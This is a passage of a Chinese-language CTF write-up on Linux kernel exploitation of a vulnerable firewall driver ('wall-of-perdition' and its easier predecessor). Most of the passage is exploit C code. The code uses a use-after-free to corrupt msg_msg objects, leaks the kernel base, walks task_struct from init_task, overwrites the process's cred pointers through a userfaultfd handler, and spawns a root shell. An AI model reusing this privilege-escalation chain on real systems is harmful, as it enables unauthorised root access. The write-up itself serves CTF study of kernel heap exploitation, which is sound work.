
```c
memset(recieved, 0, sizeof(recieved));

memset(msg_buffer, 0, sizeof(msg_buffer));

evil.m_type = 1;

evil.m_ts = size;

evil.next = (void *)init_task + 0x298 - 0x8; // -0x8是因为要保证每一次的struct msg_msgseg只利用一次，所以让他的next指针域为NULL，这0x8是留给next的

memcpy(msg_buffer, (void *)&evil, sizeof(struct msg_msg));

evil_edit(0, msg_buffer, OUTBOUND, 0);

printf("[+] recieved: %p\n",recieved);

read_from_message_queue(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); //读一次

int32_t pid;

uint64_t prev, curr;

memcpy((void*)&prev, (void *)(recieved + 0xfe0), 8);

memcpy((void*)&pid, (void *)(recieved + 0x10d8), 4);

printf("%d %d\n", pid, getpid());

// 在while中多次调用msgrcv顺着init_task扫描链表，直到找到当前进程对应的task_struct

while (pid != getpid())

{

curr = prev - 0x298;

evil.next = (void *)prev - 0x8; // 更新next指针为task链表上的下一个元素

memcpy(msg_buffer, (void *)&evil, sizeof(struct msg_msg));

evil_edit(0, msg_buffer, OUTBOUND, 0);

read_from_message_queue(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

memcpy((void*)&prev, (void *)(recieved + 0xfe0), 8);

memcpy((void*)&pid, (void *)(recieved + 0x10d8), 4);

printf("%d %d\n", pid, getpid());

}

printf("[+] Found current task_struct: %#lx\n",curr);

// UAF kmalloc-4k

firewall_add_rule(1,INBOUND);

firewall_dup_rule(1,INBOUND);

firewall_delete_rule(1,INBOUND);

memset(msg_buffer, 0, sizeof(msg_buffer));

/*
typedef struct
{
long mtype;
char mtext[1];
}msg;
*/

msg *root;

uint64_t root_size = 0x1010;

void *evil_page = mmap((void *)FAULT_PAGE-PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);

// 前8bytes要放mtype，必须是mmap之后的合法内存
// 后面的char mtext[]将会落在register_userfault中mmap的未初始化的内存区域[FAULT_PAGE,FAULT_PAGE+PAGE_SIZE]

root = (msg *)(FAULT_PAGE - 0x8);

root->mtype = 1;

// 要劫持的地方是task_struct偏移为0x538 和 0x540 的 cred *real_cred 和 cred *cred 指针
// 在handler中完成任意写

register_userfault(handler);

attack_addr = curr + 0x538 - 0x8;

printf("[+] attack_addr: %#lx\n",attack_addr);

sleep(1);

send_message(qid,root,root_size - 0x30,0);

pthread_join(thr, NULL); // 等待用于arw的handler返回

if(getuid() == 0){
system("echo \"Welcome to root sapce!\"");
system("/bin/sh");
}
else{
puts("[-] root failed");
}
}
```

# wall-of-perdition
本题是上一题的进阶版本。
主要改变在：
```c
typedef struct
{
char iface[16];
char name[16];
uint32_t ip;
uint32_t netmask;
uint16_t proto;
uint16_t port;
uint8_t action;
uint8_t is_duplicated;
#ifdef EASY_MODE
char desc[DESC_MAX];
#endif
} rule_t;
```
`Rule_t`中没有那个0x800大小的desc了，这样导致我们的对象大小发生了变化，在内核中变成了0x30大小，属于kmalloc-64 。
前面的利用过程都有点像，不同的是我找到了一个比官网WP更稳定的内核全局数据 `dynamic_kobj_ktype` 方便在不进行 `shm_file_data` 喷射的情况下拿到内核基地址。

这一部分利用过程比较复杂。我会配合原文的图片进行说明。

### 漏洞利用过程

在main函数的一开始，我们先注册两个userfaultfd，起两个handler，这两个我们后面都会用到。

```c
fd = open("/dev/firewall",O_RDWR);
register_userfault_1(page_fault_handler_1);
register_userfault_2(page_fault_handler_2);
```

之后我们构造**创建两个msg队列**一个UAF

```c
qid = create_message_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
printf("[+] Create first qid: %ld\n",qid);
// 再创建一个新的队列
qid_1 = create_message_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
printf("[+] Create second qid: %d\n",qid_1);
firewall_add_rule(0,INBOUND);
firewall_dup_rule(0,INBOUND);
firewall_delete_rule(0,INBOUND);
```

#### **进行内核堆排布**

```c
send_message(qid,0x40,'A'); //msgsz = full_size - sizeof(struct msg_msg)
send_message(qid_1,0x40,0x21); //msgsz = full_size - sizeof(struct msg_msg)
send_message(qid_1,0x1ff8,'A'); //msgsz = full_size - sizeof(struct msg_msg)
printf("\n[+] Create two msg_msg and one msg_msgseg DONE\n");
```

[![4SxhB8.png](upload/attach/202109/876323_8W5SYTSU9SZSBF2.jpg)](<mark class="encrypted">e9bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1j5@1f1%4S2Z5b7U0S2Q4x3U0V1`.</mark>

此时，在针对qid发送消息的时候，会将我们释放的rule从kmalloc-64中再拉回来，变成了上方的msg_msg#1。而通过对这个msg_msg的m_ts的劫持，进而可以实现任意（越界）读。

```c
// OOB Read
struct msg_msg evil;
size = 0x2000;
memset(&evil,0,sizeof(struct msg_msg));
evil.m_list.next = (void *)0x4141414141414141;
evil.m_list.prev = (void *)0x4242424242424242;
evil.m_type = 1;
evil.m_ts = size;
memset(msg_buffer, 0, sizeof(msg_buffer));
memcpy(msg_buffer, (void *)&evil, 0x20);
evil_edit(0, msg_buffer, OUTBOUND, 1);
memset(recieved, 0, sizeof(recieved));
read_from_message_queue(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
```

通过越界读，我们可以读到以下内容：

- **下方的msg_msg#2的地址以及其对应的msg_msg队列相关的指针**。需要用于后期在任意地址释放构造恶意链表时修正msg_msg的链表指针。

- 下方的全局不受fg-kaslr影响偏移的全局数据。我这里找到一个比原文更稳定的：`dynamic_kobj_ktype` 用于泄漏内核地址。
dump对应的数据：
```c
sleep(1);

for (int i = 0; i < size / 8; i++)
{
if ( ((*(uint64_t *)(recieved + i * 8) & 0xffff) == 0x4242) && (!queue || !large_msg))
{
//第一个msg_msg的prev指针对应的msg queue
queue = ((uint64_t *)recieved)[i - 5]; // -0x28
large_msg = ((uint64_t *)recieved)[i - 6]; ; // -0x30
//printf("[*] hit %#lx\n",recieved + i * 8);debug();
}
if ((*(uint64_t *)(recieved + i * 8) & 0xfffff) == 0x159a0)
{
sysfs_bin_kfops_ro = *(uint64_t *)(recieved + i * 8);
printf("[+] hit sysfs_bin_kfops_ro: %#lx\n",(uint64_t)(recieved + i * 8));
kernel_base = sysfs_bin_kfops_ro - (0xffffffffa82159a0 - 0xffffffffa7800000);
break;
}else if((*(uint64_t *)(recieved + i * 8) & 0xfffff) == 0x41600){
dynamic_kobj_ktype = *(uint64_t *)(recieved + i * 8);
printf("[+] hit dynamic_kobj_ktype: %#lx\n",(uint64_t)(recieved + i * 8));
kernel_base = dynamic_kobj_ktype - (0xffffffffa4441600 - 0xffffffffa3800000);
break;
}
if(i == ((size / 8)-1) ){
puts("[-] Dump \"sysfs_bin_kfops_ro | dynamic_kobj_ktype | \" from msg Queue FAILED");
exit(0);
}
}
init_task = kernel_base + (0xffffffff81c124c0 - 0xffffffff81000000);
init_cred = kernel_base + (0xffffffff81c33060 - 0xffffffff81000000);
printf("[*] kernel_base: %#lx\n",kernel_base);
printf("[*] init_task: %#lx\n",init_task);
printf("[*] init_cred: %#lx\n",init_cred);
printf("[*] queue: %#lx\n",queue);
printf("[*] large_msg: %#lx\n",large_msg);
if(!queue || !large_msg){
printf("[-] !queue || !large_msg\n");
exit(-1);
}
```
接下来像上一题一样，扫描task_struct链表，找到当前进程的task_struct，读出pid，cred *。
```c
// 再触发一次edit，此时改msg_msg的next指针指向init_task + 0x290
// 目的是在通过多次msgrcv来扫描链表，此时链表next指针(struct msg_msgseg *next) 被劫持指向了init_task
// 那么实际上我们就是在扫描系统的task链表，直到找到当前进程对应的task_struct

memset((void *)&evil, 0, sizeof(struct msg_msg));
memset(recieved, 0, sizeof(recieved));
memset(msg_buffer, 0, sizeof(msg_buffer));
evil.m_type = 1;
evil.m_ts = size;
evil.next = (void *)init_task + 0x298 - 0x8; // -0x8是因为要保证每一次的struct msg_msgseg只利用一次，所以让他的next指针域为NULL，这0x8是留给next的
memcpy(msg_buffer, (void *)&evil, sizeof(struct msg_msg));
evil_edit(0, msg_buffer, OUTBOUND, 0);
printf("[+] recieved: %p\n",recieved);
//debug();
read_from_message_queue(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); //读一次
int32_t pid;
uint64_t prev, curr;
memcpy((void*)&prev, (void *)(recieved + 0xfe0), 8);
memcpy((void*)&pid, (void *)(recieved + 0x10d8), 4);
printf("%d %d\n", pid, getpid());
// 在while中多次调用msgrcv顺着init_task扫描链表，直到找到当前进程对应的task_struct
while (pid != getpid())
{
curr = prev - 0x298;
evil.next = (void *)prev - 0x8; // 更新next指针为task链表上的下一个元素
memcpy(msg_buffer, (void *)&evil, sizeof(struct msg_msg));
evil_edit(0, msg_buffer, OUTBOUND, 0);
read_from_message_queue(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
memcpy((void*)&prev, (void *)(recieved + 0xfe0), 8);
memcpy((void*)&pid, (void *)(recieved + 0x10d8), 4);
printf("%d %d\n", pid, getpid());
}
printf("[+] Found current task_struct: %#lx\n",curr);
memcpy((void*)&cred_struct, (void *)(recieved + 0x1a8+0x10d8), 8);
printf("[+] Leaked current task cred struct: 0x%lx\n", cred_struct);
```
